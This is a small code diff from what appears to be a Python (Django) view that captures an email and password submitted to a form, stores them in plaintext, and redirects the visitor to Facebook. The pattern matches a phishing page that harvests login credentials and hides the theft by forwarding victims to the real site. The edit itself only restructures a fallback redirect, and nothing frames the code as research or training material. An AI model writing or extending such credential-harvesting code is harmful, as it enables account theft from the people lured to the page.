@@ -14,5 +14,5 @@ def get_data(request):
             data = Info(email=email, password=password)
             data.save()
             return redirect('https://www.facebook.com')
-        else:
-            return redirect('main')
+        
+    return redirect('main')
